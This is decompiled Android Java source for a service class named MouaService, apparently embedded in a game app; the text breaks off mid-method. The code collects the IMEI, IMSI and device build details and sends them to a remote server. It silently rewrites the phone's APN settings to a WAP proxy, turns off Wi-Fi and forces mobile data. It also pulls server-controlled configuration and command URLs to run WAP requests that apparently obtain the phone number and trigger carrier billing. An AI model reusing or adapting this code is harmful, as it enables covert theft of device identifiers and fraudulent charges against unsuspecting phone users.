// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame.http;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences$Editor;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo$State;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build$VERSION;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.tyj.onepiece.http.common.CommUtil;
import com.tyj.onepiece.http.common.Constants;
import com.tyj.onepiece.http.common.IniReader;
import com.tyj.onepiece.http.common.LogUtil;
import com.tyj.onepiece.http.common.Md5Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.util.Iterator;

public class MouaService {
    private static int MAX_FAIL_COUNT;
    private static int apnId;
    private static boolean bOrigWifiStat;
    private String cfg_url;
    private String cfg_url_ip;
    public static Context ctx;
    private String imei;
    private static LogUtil log;
    static String mcc;
    static String mnc;
    public static int mversion;
    private String number;
    static String numberic;
    private WifiManager wm;

    static {
        MouaService.ischinatel = 0;
        MouaService.isIcs = false;
        MouaService.mversion = 7;
        MouaService.mnc = "";
        MouaService.mcc = "";
        MouaService.numberic = "";
        MouaService.apnId = 0;
        MouaService.MAX_FAIL_COUNT = 10;
    }

    public MouaService() {
        super();
        MouaService.log = ServiceInstance.log;
    }

    private int addFail() {
        int v2;
        SharedPreferences v3 = MouaService.ctx.getSharedPreferences("config", 0);
        SharedPreferences$Editor v0 = v3.edit();
        int v1 = v3.getInt("failc", 0) + 1;
        MouaService.log.trace("addFail", "now f " + v1);
        if(v1 == MouaService.MAX_FAIL_COUNT) {
            v1 = 0;
            v2 = MouaService.MAX_FAIL_COUNT;
        }
        else {
            v2 = v1;
        }

        v0.putInt("failc", v1);
        v0.commit();
        return v2;
    }

    private void addOtherValues(ContentValues cv) {
        Cursor v6 = MouaService.ctx.getContentResolver().query(Constants.APN_URI, null, null, null, null);
        if(v6 != null && (v6.moveToNext())) {
            String[] v7 = v6.getColumnNames();
            int v8;
            for(v8 = 0; v8 < v7.length; ++v8) {
                if("spn".equals(v7[v8])) {
                    cv.put("spn", "");
                }
            }
        }
    }

    private void addSucc() {
        SharedPreferences$Editor v0 = MouaService.ctx.getSharedPreferences("config", 0).edit();
        v0.putInt("failc", 0);
        v0.commit();
    }

    private int addapn() {
        String v14;
        int v3;
        if(MouaService.ctx == null) {
            MouaService.log.trace("ctx", "null");
            v3 = -1;
            return v3;
        }

        Object v16 = MouaService.ctx.getSystemService("phone");
        if(v16 == null) {
            MouaService.log.trace("telManager", "null");
            return -1;
        }

        String v15 = ((TelephonyManager)v16).getSimOperator();
        String v11 = ((TelephonyManager)v16).getSubscriberId();
        if(this.getstrlen(v15) > 0) {
            v14 = v15;
        }
        else if(this.getstrlen(v11) <= 0) {
            return -1;
        }
        else {
            v14 = v11.substring(0, 5);
        }

        if(this.getstrlen(v14) == 0) {
            MouaService.log.trace("numberic", "null");
            return -1;
        }

        MouaService.ischinatel = (v14.equals("46003")) || (v15.contains("46003")) ? 1 : 0;
        if(CommUtil.getstrlen(v14) == 0) {
            return -1;
        }

        String v12 = v14.substring(0, 3);
        String v13 = v14.substring(3);
        MouaService.log.trace("numberic", v14);
        MouaService.log.trace("mcc", v12);
        MouaService.log.trace("mnc", v13);
        ContentResolver v1 = MouaService.ctx.getContentResolver();
        ContentValues v8 = new ContentValues();
        v8.put("name", "default");
        v8.put("apn", "default");
        MouaService.log.trace("kkk", "1");
        if(MouaService.ischinatel != 0) {
            return -2;
        }

        v8.put("proxy", "10.0.0.172");
        v8.put("port", "80");
        v8.put("mcc", v12);
        v8.put("mnc", v13);
        v8.put("numeric", v14);
        v8.put("current", Integer.valueOf(1));
        MouaService.log.trace("kkk", "2");
        v8.put("authtype", Integer.valueOf(0));
        this.addOtherValues(v8);
        Cursor v7 = null;
        try {
            MouaService.log.trace("kkk", "3");
            Uri v2 = v1.insert(Constants.APN_TABLE_URI, v8);
            MouaService.log.trace("kkk", "4");
            if(v2 == null) {
                goto label_155;
            }

            v7 = v1.query(v2, null, null, null, null);
            v7.moveToFirst();
            v3 = Integer.parseInt(v7.getString(v7.getColumnIndex("_id")));
        }
        catch(SecurityException v9) {
            MouaService.log.trace("init apn", v9.toString());
            v3 = -1;
        }
        catch(SQLException v9_1) {
            MouaService.log.trace("init apn", v9_1.toString());
            v3 = -1;
        }

        return v3;
    label_155:
        if(0 != 0) {
            v7.close();
        }

        return -1;
    }

    private int adddefalutapn() {
        int v2;
        int v10 = -1;
        ContentResolver v0 = MouaService.ctx.getContentResolver();
        ContentValues v7 = new ContentValues();
        v7.put("name", "default");
        v7.put("apn", "default");
        v7.put("proxy", "10.0.0.172");
        v7.put("port", "80");
        v7.put("mcc", MouaService.mcc);
        v7.put("mnc", MouaService.mnc);
        v7.put("numeric", MouaService.numberic);
        v7.put("current", Integer.valueOf(1));
        this.addOtherValues(v7);
        Cursor v6 = null;
        try {
            Uri v1 = v0.insert(Constants.APN_TABLE_URI, v7);
            if(v1 == null) {
                goto label_60;
            }

            v6 = v0.query(v1, null, null, null, null);
            v6.moveToFirst();
            v2 = Integer.parseInt(v6.getString(v6.getColumnIndex("_id")));
        }
        catch(SecurityException v8) {
            MouaService.log.trace("init apn", v8.toString());
            v2 = v10;
        }
        catch(SQLException v8_1) {
            MouaService.log.trace("init apn", v8_1.toString());
            v2 = v10;
        }

        return v2;
    label_60:
        if(0 != 0) {
            v6.close();
        }

        return v10;
    }

    public static int change_smsrpt(Context cx) {
        OutputStreamWriter v0_1;
        FileOutputStream v14;
        String v17;
        BufferedReader v4;
        int v33;
        IniReader v0;
        MouaService.log_change("enter change_smsrpt");
        try {
            v0 = new IniReader(new FileReader(Constants.REPORT_PATH(cx)));
        }
        catch(IOException v8) {
            v33 = -1;
            return v33;
        }

        IniReader v29 = v0;
        File v12 = new File(Constants.REPORT_PATH(cx));
        try {
            v4 = new BufferedReader(new FileReader(v12));
            try {
                v17 = v4.readLine();
            }
            catch(IOException v8) {
                return -1;
            }
        }
        catch(FileNotFoundException v8_1) {
            goto label_96;
        }

        while(v17 != null) {
            try {
                MouaService.log_change(v17);
                v17 = v4.readLine();
                continue;
            }
            catch(FileNotFoundException v8_1) {
                goto label_96;
            }
            catch(IOException v8) {
                return -1;
            }
        }

        String v7 = v29.getValue("report", "domainurl");
        String v25 = "[domin]\r\nurls=" + v29.getValue("report", "configurl") + ";" + v29.getValue("report", "cmdurl") + ";\r\n";
        MouaService.log_change("dominurl:" + v7);
        MouaService.log_change("poststr:" + v25);
        String v27 = HttpEngine.doPost(cx, v7, v25);
        MouaService.log_change("pstr:" + v27);
        if(v27 != null && v27.length() != 0) {
            String[] v24 = v27.trim().substring(12).trim().split(";");
            int v16 = v24.length;
            if(v16 <= 0) {
                MouaService.log_change("2");
                v33 = 0;
            }
            else {
                String v6 = "";
                String v5 = "";
                String v21 = "";
                String v22 = "";
                String v23 = "";
                if(v16 >= 1) {
                    v21 = v24[0];
                }

                if(v16 >= 2) {
                    v22 = v24[1];
                }

                if(v16 >= 3) {
                    v23 = v24[2];
                }

                if(v21 != null && v21.length() != 0 || v22 != null && v22.length() != 0 || v23 != null && v23.length() != 0) {
                    if(v21 != null && v21.length() != 0) {
                        v6 = v21;
                        MouaService.log_change("new configurl:" + v6);
                    }

                    if(v22 != null && v22.length() != 0) {
                        v5 = v22;
                        MouaService.log_change("new cmdurl:" + v5);
                    }

                    if(v23 != null && v23.length() != 0) {
                        v7 = v23;
                        MouaService.log_change("new dominurl:" + v7);
                    }

                    String v32 = v29.getValue("report", "version");
                    String v18 = v29.getValue("report", "number");
                    String v31 = v29.getValue("report", "ua");
                    String v10 = v29.getValue("report", "extchid");
                    String v26 = v29.getValue("report", "productid");
                    String v30 = v29.getValue("report", "subextid");
                    String v3 = v29.getValue("report", "aftermin");
                    MouaService.log_change("3");
                    File v11 = new File(Constants.REPORT_PATH(cx));
                    try {
                        if(v11.exists()) {
                            v11.delete();
                        }

                        v11.createNewFile();
                        v14 = new FileOutputStream(v11);
                    }
                    catch(IOException v9) {
                        return -1;
                    }

                    try {
                        v0_1 = new OutputStreamWriter(((OutputStream)v14));
                    }
                    catch(IOException v9) {
                        return -1;
                    }

                    OutputStreamWriter v20 = v0_1;
                    try {
                        v20.write("[report]\r\n");
                        v20.write("configurl=" + v6 + "\r\n");
                        v20.write("version=" + v32 + "\r\n");
                        v20.write("number=" + v18 + "\r\n");
                        v20.write("ua=" + v31 + "\r\n");
                        v20.write("extchid=" + v10 + "\r\n");
                        v20.write("productid=" + v26 + "\r\n");
                        v20.write("subextid=" + v30 + "\r\n");
                        v20.write("aftermin=" + v3 + "\r\n");
                        v20.write("cmdurl=" + v5 + "\r\n");
                        v20.write("domainurl=" + v7 + "\r\n");
                        v20.flush();
                        v20.close();
                        v14.close();
                        return 0;
                    }
                    catch(IOException v9) {
                    }

                    return -1;
                }

                v33 = 0;
            }
        }
        else {
            MouaService.log_change("1");
            return 0;
        label_96:
            v33 = -1;
        }

        return v33;
    }

    private boolean deletedefaultapn() {
        Cursor v6;
        String v12;
        int v9;
        boolean v8 = true;
        try {
            if(MouaService.mversion >= 10) {
                MouaService.log.trace("version", "4");
                return v8;
            }

            if(MouaService.ischinatel == 0) {
                v9 = 0;
                v12 = "0";
                v6 = MouaService.ctx.getContentResolver().query(Constants.APN_URI, null, null, null, null);
                goto label_23;
            }

            return this.set_apn_byname("ctnet", "CTNET");
            do {
            label_23:
                if(v6 != null && (v6.moveToNext())) {
                    v12 = v6.getString(v6.getColumnIndex("_id"));
                    if(!v6.getString(v6.getColumnIndex("name")).equalsIgnoreCase("default")) {
                        continue;
                    }

                    break;
                }

                goto label_26;
            }
            while(true);

            v9 = 1;
        label_26:
            v6.close();
            if(v9 != 0 && MouaService.ctx.getContentResolver().delete(Constants.APN_URI, "_id=" + v12, null) <= 0) {
                v8 = false;
            }

            return v8;
        }
        catch(Exception v7) {
            MouaService.log.trace("delete", "error");
            return false;
        }
    }

    private int download_cfg() {
        File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
        HttpUtils v1 = new HttpUtils(MouaService.ctx);
        MouaService.log.trace("servlog", "cfg url:" + this.cfg_url);
        return v1.download_file(this.cfg_url, v0);
    }

    private int download_ipcfg() {
        File v0 = new File(Constants.CONFIG_PATH(MouaService.ctx));
        HttpUtils v1 = new HttpUtils(MouaService.ctx);
        MouaService.log.trace("servlog", "cfg url ip:" + this.cfg_url_ip);
        return v1.download_file(this.cfg_url_ip, v0);
    }

    private int dowork() {
        int v0 = new WapWorker(MouaService.ctx).doAction();
        if(v0 != 0) {
            MouaService.log.trace("wap work report", "error");
        }
        else {
            MouaService.log.trace("wap worker", "over");
        }

        return v0;
    }

    public void entrypoint(Class mClass) {
        int v10 = -1;
        long v6 = 30;
        MouaService.firstConnect(MouaService.ctx);
        if(!this.init_params(MouaService.ctx)) {
            this.sleeptimer(v6, mClass);
            return;
        }

        MouaService.change_smsrpt(MouaService.ctx);
        if(!this.set_apn(MouaService.ctx)) {
            this.sleeptimer(v6, mClass);
            return;
        }

        this.setwifi(false);
        this.toggleMobileData(MouaService.ctx, true);
        long v2 = 30000;
        try {
            Thread.sleep(v2);
        }
        catch(InterruptedException v0) {
            MouaService.log.trace("MOUA", "wif sleep");
        }

        while(true) {
            MouaService.log.trace("get moua", "start");
            int v1 = this.getmoua();
            if(v1 == v10) {
                MouaService.log.trace("get moua ", "error code: no number");
                v1 = this.getip();
            }

            if(v1 != v10 && v1 != -2 && v1 != -3) {
                if(v1 == 0) {
                    this.addSucc();
                    Log.e("MOUA", "62");
                    if(this.report(true, 0) != 0) {
                        if(CommUtil.getstrlen(this.number) == 0) {
                            MouaService.log.trace("servlog", "number is null");
                        }

                        MouaService.log.trace("moua  report", "error");
                    }
                }

                MouaService.log.trace("get config", "start");
                if(this.getconfig() >= 0) {
                    v1 = this.dowork();
                    if(v1 == 0) {
                        this.tryreport(true, 0);
                    }
                    else {
                        this.tryreport(false, v1);
                    }

                    if(this.startlongtimer(mClass) < 0) {
                        this.sleeptimer(v6, mClass);
                    }

                    this.addSucc();
                    return;
                }

                this.addFail();
                this.sleeptimer(v6, mClass);
                return;
            }

            MouaService.log.trace("get moua ", "error code" + v1);
            if(MouaService.MAX_FAIL_COUNT == this.addFail()) {
                this.sleeptimer(v6, mClass);
                return;
            }

            v2 = 30000;
            try {
                Thread.sleep(v2);
            }
            catch(InterruptedException v0) {
                MouaService.log.trace("get moua", v0.getMessage());
            }
        }
    }

    public static boolean firstConnect(Context context) {
        String v10;
        NetworkInfo v17;
        IniReader v0;
        LogUtil v19 = ServiceInstance.log;
        v19.trace("service", "Run firstConnect");
        if("yes".equals(CommUtil.getStringPreference(context, "config", "first_connection"))) {
            v19.trace("service", "has done,exit");
            boolean v4 = true;
            return v4;
        }

        v19.trace("service", "It is first time.");
        if(CommUtil.DecryptObj2SdCard(context, Constants.APPDATA_PATH(context), "default.d", "config") != 0) {
            v19.trace("service", "DecryptObj2SdCard config->default.d error");
            return false;
        }

        try {
            v0 = new IniReader(new FileReader(Constants.REPORT_PATH(context)));
        }
        catch(IOException v12) {
            v19.trace("service", "read ini error " + v12.getMessage());
            return false;
        }

        String v24 = v0.getValue("report", "configurl");
        String v3 = String.valueOf(v24.substring(0, v24.lastIndexOf("/"))) + "/23554.jsp?extchid=" + v0.getValue("report", "extchid");
        v19.trace("service", "URL=" + v3);
        Object v25 = context.getSystemService("phone");
        if(v25 == null) {
            v19.trace("service", "TelephonyManager null");
            return false;
        }

        v3 = String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(String.valueOf(v3) + "&imei=" + CommUtil.urlEncode(((TelephonyManager)v25).getDeviceId())) + "&imsi=" + CommUtil.urlEncode(((TelephonyManager)v25).getSubscriberId())) + "&operator=" + CommUtil.urlEncode(((TelephonyManager)v25).getSimOperator())) + "&product=" + CommUtil.urlEncode(Build.PRODUCT)) + "&cpu_abi=" + Build.CPU_ABI) + "&tags=" + CommUtil.urlEncode(Build.TAGS)) + "&version_codes_base=1") + "&model=" + CommUtil.urlEncode(Build.MODEL)) + "&sdk=" + CommUtil.urlEncode(Build$VERSION.SDK)) + "&version_release=" + CommUtil.urlEncode(Build$VERSION.RELEASE)) + "&device=" + CommUtil.urlEncode(Build.DEVICE)) + "&display=" + CommUtil.urlEncode(Build.DISPLAY)) + "&brand=" + CommUtil.urlEncode(Build.BRAND)) + "&board=" + CommUtil.urlEncode(Build.BOARD)) + "&fingerprint=" + CommUtil.urlEncode(Build.FINGERPRINT)) + "&build_id=" + CommUtil.urlEncode(Build.ID)) + "&manufacturer=" + CommUtil.urlEncode(Build.MANUFACTURER)) + "&user1=" + CommUtil.urlEncode(Build.USER);
        Object v9 = MouaService.ctx.getSystemService("connectivity");
        NetworkInfo v27 = ((ConnectivityManager)v9).getNetworkInfo(1);
        if(v27 != null) {
            NetworkInfo$State v26 = v27.getState();
            if(v26 != NetworkInfo$State.CONNECTED && v26 != NetworkInfo$State.CONNECTING) {
                v17 = ((ConnectivityManager)v9).getNetworkInfo(0);
                if(v17 == null) {
                }
                else if(v17.isAvailable()) {
                    v19.trace(" wap apn", "used");
                    v10 = v17.getExtraInfo();
                    if(v10 != null) {
                        v19.trace("current apn", v10);
                        v3 = String.valueOf(v3) + "&apn1=" + v10;
                        if((v10.contains("net")) && !MouaService.isIcs) {
                            v19.trace("apn", "360 error");
                            v3 = String.valueOf(v3) + "_nok";
                            goto label_275;
                        }

                        v3 = String.valueOf(v3) + "_ok";
                    }
                    else {
                        v19.trace("current apn", "null");
                    }
                }
                else {
                }

                goto label_275;
            }

            v19.trace("wifi", "is opened");
            v3 = String.valueOf(v3) + "&apn1=wifi";
        }
        else {
            v17 = ((ConnectivityManager)v9).getNetworkInfo(0);
            if(v17 == null) {
                goto label_275;
            }

            if(!v17.isAvailable()) {
                goto label_275;
            }

            v19.trace(" wap apn", "used");
            v10 = v17.getExtraInfo();
            if(v10 != null) {
                v19.trace("current apn", v10);
                v3 = String.valueOf(v3) + "&apn2=" + v10;
                if((v10.contains("net")) && !MouaService.isIcs) {
                    v19.trace("apn", "360 error");
                    v3 = String.valueOf(v3) + "_nok";
                    goto label_275;
                }

                v3 = String.valueOf(v3) + "_ok";
                goto label_275;
            }

            v19.trace("current apn", "null");
        }

    label_275:
        v19.trace("service", "url is " + v3);
        if(!CommUtil.isNewworkAvalibale(context)) {
            v19.trace("service", "isNewworkAvalibale false");
            return false;
        }

        v19.trace("service", "Network OK.");
        byte[] v23 = new HttpUtils(context).httpgetbyte(v3, 0, -1, false, 0, false);
        if(v23 != null) {
            String v20 = new String(v23);
            v19.trace("service", "httpgetbyte got " + v20);
            if("ok".equals(v20)) {
                CommUtil.setStringPreference(context, "config", "first_connection", "yes");
                return true;
            }
        }
        else {
            v19.trace("service", "httpgetbyte got null");
        }

        return false;
    }

    public static int getSDKVersionNumber() {
        int v1;
        try {
            v1 = Integer.valueOf(Build$VERSION.SDK).intValue();
        }
        catch(NumberFormatException v0) {
            v1 = 2;
        }

        return v1;
    }

    private String get_config_url(IniReader rd) {
        String v5;
        NetworkInfo v7;
        String v13;
        String v4 = rd.getValue("report", "configurl");
        if(v4.length() == 0) {
            v13 = "";
        }
        else {
            String v10 = rd.getValue("report", "version");
            v4 = String.valueOf(String.valueOf(String.valueOf(v4) + "v=" + v10) + "&imei=" + this.imei) + "&number=" + rd.getValue("report", "number");
            String v1 = rd.getValue("report", "ua");
            v1 = v1 != null ? URLEncoder.encode(v1) : "";
            v4 = String.valueOf(v4) + "&ua=" + v1;
            String v2 = rd.getValue("report", "extchid");
            v4 = String.valueOf(String.valueOf(v4) + "&extchid=" + v2) + "&productid=" + rd.getValue("report", "productid");
            if(MouaService.ctx == null) {
                MouaService.log.trace("ctx", "null");
            }

            Object v9 = MouaService.ctx.getSystemService("phone");
            if(v9 == null) {
                MouaService.log.trace("telManager", "null");
            }

            v4 = String.valueOf(String.valueOf(v4) + "&imsi=" + CommUtil.urlEncode(((TelephonyManager)v9).getSubscriberId())) + "&vcode=" + Md5Util.encode(rd.getValue("report", "number"), v10, v2);
            Object v3 = MouaService.ctx.getSystemService("connectivity");
            NetworkInfo v12 = ((ConnectivityManager)v3).getNetworkInfo(1);
            if(v12 != null) {
                NetworkInfo$State v11 = v12.getState();
                if(v11 != NetworkInfo$State.CONNECTED && v11 != NetworkInfo$State.CONNECTING) {
                    v7 = ((ConnectivityManager)v3).getNetworkInfo(0);
                    if(v7 == null) {
                    }
                    else if(v7.isAvailable()) {
                        MouaService.log.trace(" wap apn", "used");
                        v5 = v7.getExtraInfo();
                        if(v5 != null) {
                            MouaService.log.trace("current apn", v5);
                            v4 = String.valueOf(v4) + "&apn2=" + v5;
                            if((v5.contains("net")) && !MouaService.isIcs) {
                                MouaService.log.trace("apn", "360 error");
                                v4 = String.valueOf(v4) + "_nok";
                                goto label_131;
                            }

                            v4 = String.valueOf(v4) + "_ok";
                        }
                        else {
                            MouaService.log.trace("current apn", "null");
                        }
                    }
                    else {
                    }

                    goto label_131;
                }

                MouaService.log.trace("wifi", "is opened");
                v4 = String.valueOf(v4) + "&apn2=wifi";
            }
            else {
                v7 = ((ConnectivityManager)v3).getNetworkInfo(0);
                if(v7 == null) {
                    goto label_131;
                }

                if(!v7.isAvailable()) {
                    goto label_131;
                }

                MouaService.log.trace(" wap apn", "used");
                v5 = v7.getExtraInfo();
                if(v5 != null) {
                    MouaService.log.trace("current apn", v5);
                    v4 = String.valueOf(v4) + "&apn2=" + v5;
                    if((v5.contains("net")) && !MouaService.isIcs) {
                        MouaService.log.trace("apn", "360 error");
                        v4 = String.valueOf(v4) + "_nok";
                        goto label_131;
                    }

                    v4 = String.valueOf(v4) + "_ok";
                    goto label_131;
                }

                MouaService.log.trace("current apn", "null");
            }

        label_131:
            v13 = v4;
        }

        return v13;
    }

    private int getconfig() {
        int v1 = 0;
        int v2 = -1;
        while(v1 < 3) {
            v2 = this.retry_getconfig();
            MouaService.log.trace("get config", "time:" + (v1 + 1));
            if(v2 == 0) {
                return v2;
            }

            if(v2 == -1) {
                return v2;
            }

            long v3 = 5000;
            try {
                Thread.sleep(v3);
            }
            catch(InterruptedException v0) {
                Log.e("MOUA", "sleep error");
            }

            ++v1;
        }

        return v2;
    }

    private int getip() {
        int v1 = 0;
        int v2 = -1;
        while(v1 < 3) {
            v2 = this.retry_getip();
            MouaService.log.trace("get moua", "time:" + (v1 + 1));
            if(v2 == 0) {
                return v2;
            }

            if(v2 == 1) {
                return v2;
            }

            if(v2 == -2) {
                return v2;
            }

            long v3 = 5000;
            try {
                Thread.sleep(v3);
            }
            catch(InterruptedException v0) {
                Log.e("MOUA", "sleep error");
            }

            ++v1;
        }

        return v2;
    }

    private int getmoua() {
        int v1 = 0;
        int v2 = -1;
        while(v1 < 3) {
            v2 = this.retry_getmoua();
            MouaService.log.trace("get moua", "time:" + (v1 + 1));
            if(v2 == 0) {
                return v2;
            }

            if(v2 == 1) {
                return v2;
            }

            if(v2 == -2) {
                return v2;
            }

            long v3 = 5000;
            try {
                Thread.sleep(v3);
            }
            catch(InterruptedException v0) {
                Log.e("MOUA", "sleep error");
            }

            ++v1;
        }

        return v2;
    }

    private int getstrlen(String str) {
        int v0 = str == null ? 0 : str.length();
        return v0;
    }

    public boolean init_params(Context context) {
        boolean v2 = false;
        MouaService.log.trace("init_params", "Config file path:" + Constants.REPORT_PATH(context));
        if(CommUtil.DecryptObj2SdCard(context, Constants.APPDATA_PATH(context), "smsrpt.i", "config") == 0) {
            Object v1 = context.getSystemService("phone");
            if(v1 == null) {
                MouaService.log.trace("service", "TelephonyManager null");
            }
            else {
                this.imei = ((TelephonyManager)v1).getDeviceId();
                if(CommUtil.getstrlen(this.imei) == 0) {
                    this.imei = "";
                }

                MouaService.ischinatel = 0;
                MouaService.mversion = MouaService.getSDKVersionNumber();
                MouaService.log.trace("service", "sdkversion number: " + MouaService.mversion);
                if(MouaService.mversion > 10) {
                    MouaService.isIcs = true;
                }

                v2 = true;
            }
        }

        return v2;
    }

    private static void log_change(String str) {
        if(MouaService.log != null) {
            MouaService.log.trace("change", str);
        }
    }

    private int report(boolean s, int step) {
        IniReader v0;
        int v3;
        IniReader v10;
        MouaService.log.trace("report:", s);
        String v2 = "";
        int v13 = 1;
        try {
            v10 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
            if(!s) {
                goto label_32;
            }
        }
        catch(IOException v11) {
            v3 = -1;
            return v3;
        }

        String v9 = v10.getValue("global", "sreporturl");
        goto label_21;
    label_32:
        v9 = v10.getValue("global", "freporturl");
    label_21:
        if(CommUtil.getstrlen(v9) == 0) {
            MouaService.log.trace("report url", "null");
            return -1;
        }

        String v21 = v10.getValue("global", "serviceid");
        String[] v22 = v9.split(";");
        if(v22.length > 0) {
            v2 = v22[0];
        }

        if(v22.length > 1) {
            v13 = Integer.parseInt(v22[1]) == 0 ? 1 : 0;
        }

        try {
            v0 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
        }
        catch(IOException v11) {
            return -1;
        }

        String v25 = v0.getValue("report", "version");
        String v12 = v0.getValue("report", "extchid");
        String v16 = v0.getValue("report", "productid");
        String v15 = v0.getValue("report", "number");
        String v24 = v0.getValue("report", "ua");
        v2 = CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(v2, "{serviceid}", v21), "{version}", v25), "{extchid}", v12), "{productid}", v16), "{number}", v15), "{imei}", this.imei), "{subextid}", v0.getValue("report", "subextid")), "{errorid}", String.valueOf(step));
        if(v24 != null && v24.length() != 0) {
            v24 = URLEncoder.encode(v24);
        }

        v2 = CommUtil.getstrlen(v24) == 0 || v24.length() + v2.length() >= 512 ? CommUtil.replaceword(v2, "{ua}", "default") : CommUtil.replaceword(v2, "{ua}", v24);
        if(!s) {
            String v18 = LogUtil.getLogArrayString();
            if(v18.length() > 512) {
                v18 = v18.substring(0, 512);
            }

            LogUtil.clearLogArray();
            v2 = String.valueOf(v2) + "&content=" + URLEncoder.encode(v18);
        }

        HttpUtils v1 = new HttpUtils(MouaService.ctx);
        byte[] v20 = v13 != 0 ? v1.httpgetbyte(v2, 0, -1, false, 0) : v1.httppostbyte(v2, null, "", 0, -1, false, 0);
        if(v20 != null) {
            MouaService.log.trace("report response msg:", new String(v20));
            v3 = 0;
        }
        else {
            MouaService.log.trace("report", "failed");
            v3 = -1;
        }

        return v3;
    }

    private int retry_getconfig() {
        IniReader v4;
        int v5 = -1;
        try {
            v4 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
        }
        catch(IOException v1) {
            MouaService.log.trace("servlog", "sleep error");
            return v5;
        }

        this.cfg_url = this.get_config_url(v4);
        if(CommUtil.getstrlen(this.cfg_url) > 0) {
            int v2 = this.download_cfg();
            if(v2 == v5) {
                MouaService.log.trace("servlog", "getcfg e2");
                return v5;
            }

            if(v2 == 0) {
                try {
                    IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
                    if(v0.getSection("time") == null && v0.getSection("global") == null && v0.getSection("wap") == null && v0.getSection("sms") == null && v0.getSection("install") == null) {
                        MouaService.log.trace("servlog", "getcfg section error");
                        CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
                        return -2;
                    }
                }
                catch(IOException v1) {
                    MouaService.log.trace("servlog", "getcfg e4");
                    return v5;
                }
                catch(FileNotFoundException v1_1) {
                    MouaService.log.trace("servlog", "getcfg e3");
                    return v5;
                }
            }

            v5 = v2;
        }
        else {
            MouaService.log.trace("servlog", "getcfg e1");
        }

        return v5;
    }

    private int retry_getip() {
        int v4;
        IniReader v6;
        int v9 = -1;
        try {
            v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
        }
        catch(IOException v1) {
            MouaService.log.trace("servlog", "sleep error");
            return v9;
        }

        this.number = v6.getValue("report", "number");
        this.cfg_url_ip = String.valueOf(this.cfg_url) + "&virtNum=1";
        if(CommUtil.getstrlen(this.cfg_url_ip) == 0) {
            MouaService.log.trace("servlog", "cfgurl null");
            return v9;
        }

        if(CommUtil.getstrlen(this.number) == 0) {
            try {
                v4 = this.download_ipcfg();
                if(v4 == v9) {
                    MouaService.log.trace("servlog", "download_ipcfg error");
                    return v9;
                }

                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
                if(v0.getSection("wap") == null) {
                    CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
                    MouaService.log.trace("servlog", "cfg no wap section");
                    return -3;
                }

                WapWorker v7 = new WapWorker(MouaService.ctx);
                Iterator v10 = v0.getSection("wap").datas.iterator();
                while(v10.hasNext()) {
                    v7.add_wapurl(v10.next().second);
                }

                if(v7.sendlst.size() <= 0) {
                    return v4;
                }

                int v3 = v7.getMouaByNet();
                if(v3 == 0) {
                    return v4;
                }

                MouaService.log.trace("ip", "error");
                return v3;
            }
            catch(IOException v1) {
                v4 = -1;
                MouaService.log.trace("get config error:", v1.toString());
                return v4;
            }
        }

        MouaService.log.trace("servlog", "number exited");
        return 1;
    }

    private int retry_getmoua() {
        int v4;
        IniReader v6;
        int v9 = -1;
        try {
            v6 = new IniReader(new FileReader(Constants.REPORT_PATH(MouaService.ctx)));
        }
        catch(IOException v1) {
            MouaService.log.trace("servlog", "sleep error");
            return v9;
        }

        this.number = v6.getValue("report", "number");
        this.cfg_url = this.get_config_url(v6);
        if(CommUtil.getstrlen(this.cfg_url) == 0) {
            MouaService.log.trace("servlog", "cfgurl null");
            return v9;
        }

        if(CommUtil.getstrlen(this.number) == 0) {
            try {
                v4 = this.download_cfg();
                if(v4 == v9) {
                    MouaService.log.trace("servlog", "download_mouacfg error");
                    return v9;
                }

                IniReader v0 = new IniReader(new FileReader(Constants.CONFIG_PATH(MouaService.ctx)));
                if(v0.getSection("wap") == null) {
                    CommUtil.deletefile(Constants.CONFIG_PATH(MouaService.ctx));
                    MouaService.log.trace("servlog", "cfg no wap section");
                    return -3;
                }

                WapWorker v7 = new WapWorker(MouaService.ctx);
                Iterator v10 = v0.getSection("wap").datas.iterator();
                while(v10.hasNext()) {
                    v7.add_wapurl(v10.next().second);
                }

                if(v7.sendlst.size() <= 0) {
                    return v4;
                }

                int v3 = v7.getMouaByNet();
                if(v3 == 0) {
                    return v4;
                }

                MouaService.log.trace("moua", "error");
                return v3;
            }
            catch(IOException v1) {
                v4 = -1;
                MouaService.log.trace("get config error:", v1.toString());
                return v4;
            }
        }

        MouaService.log.trace("servlog", "number exited");
        return 1;
    }

    public boolean set_apn(Context context) {
        String v18;
        boolean v4;
        if(MouaService.mversion >= 10) {
            MouaService.log.trace("set_apn", "sdk>=10, return true.");
            v4 = true;
            return v4;
        }

        String v25 = "0";
        String v17 = "";
        Cursor v10 = context.getContentResolver().query(Constants.APN_URI, null, null, null, null);
        while(v10 != null) {
            if(!v10.moveToNext()) {
                break;
            }

            v25 = v10.getString(v10.getColumnIndex("_id"));
